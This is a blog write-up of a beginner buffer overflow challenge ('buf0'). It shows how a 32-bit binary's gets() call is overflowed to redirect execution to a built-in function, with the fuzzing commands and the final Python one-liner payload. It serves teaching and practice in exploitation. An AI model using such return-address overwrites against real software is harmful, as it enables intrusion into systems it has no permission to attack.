buf0 - A Buffer Overflow Challenge
==================================
date: 06/Jan/2014
summary: This is a buffer overflow challenge I found online. Although some people might find this to be a pretty easy exploit target, I thought of posting a writeup since it will still be someone's starting point into the jouney of exploitation.
tags: buffer overflow, writeups, reversing

The binary can be obtained from here: [buf0](/files/buf0.bin). Let's see
what `file` command has to tell us about this challenge file:

```shell
$ file buf0.bin
buf0.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3a0cbf6e6af7d4a5d1294f2ce18e80ad3e778d48, not stripped
```

So, this is an x86 ELF binary with symbols included. Let's run `strings`
as well over this file:

```shell
$ strings buf0.bin
/lib/ld-linux.so.2
j,O)
__gmon_start__
libc.so.6
_IO_stdin_used
gets
puts
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
W00T!
;*2$"
```

This is interesting. The binary is using `gets` syscall which is
commonly exploited against buffer overflow vulnerabilities. There is a
`W00T!` string as well which indicates that we need to exploit the
binary and get this string printed. Before we execute this file, let's
do some static analysis on it using IDA:

![image](/static/files/ida-start.png)

Apart from the standard libc defintions and `main`, I see an interesting
function called `returnToMe` at location 0x08048404. Let's follow this
function and see what is it doing:

![image](/static/files/ida-returntome.png)

Like I mentioned earlier, this is where the `W00T!` string is printed
and as per the assumption, we need to leverage the overflow in a way
that this function is called. Let's now run the binary and see how it
behaves:

```shell
$ ./buf0.bin
AAAAAAAAAAA
$
$ python -c 'print "A"*10' | ./buf0.bin
$ python -c 'print "A"*30' | ./buf0.bin
$ python -c 'print "A"*50' | ./buf0.bin
$ python -c 'print "A"*60' | ./buf0.bin
Segmentation fault (core dumped)
$
$ python -c 'print "A"*55' | ./buf0.bin
Segmentation fault (core dumped)
$ python -c 'print "A"*53' | ./buf0.bin
$ python -c 'print "A"*54' | ./buf0.bin
$ python -c 'print "A"*55' | ./buf0.bin
Segmentation fault (core dumped)
```

So, the binary accepts input through the `gets` syscall and is as such
vulnerable to a classic stack-based buffer overflow. We do some
trial-and-error to figure out the size of the buffer and it turns out to
be 54B after which any extra byte would corrupt the stack metadata
resulting in a `Segmentation fault (core dumped)` error. So, these 54B
comprise of the following stack variables:

```shell
50B (buf) + 4B (saved EBP)
```

The next 4B following saved EBP is the saved return address, EIP, and
this is what we need to overwrite to achieve successful exploitation.
For this challenge, the author wants us to overwrite EIP with the
address of the `returnToMe` function but there are others ways of
exploiting this as well:

1.  Injecting a 54B or less shellcode in the buffer and overwriting EIP
    with the start of the shellcode/NOP sled
2.  Injecting a bigger shellcode through an environment variable and
    overwriting EIP with it's address

But to keep things simple, let's just focus on how to complete the
challenge by satisfying author's criteria. To know how to exploit such
challenges using above steps please read my earlier post [Gera's Warming
Up on Stack \#1 - Solutions](/2012/8/27/geras-wuos-stack1-solutions/)
and it's subsequent parts.

From the IDA screenshot above it is already known that the `returnToMe`
function is at location 0x08048404. Let's exploit the binary with a
random payload of 54B concatenated with this new return address:

```shell
$ python -c 'print "A"*54 + "\x04\x84\x04\x08"' | ./buf0.bin
W00T!
```

Awesome! We get the required string printed, thus completing this
challenge. Stay tuned for a post on a similar challenge.
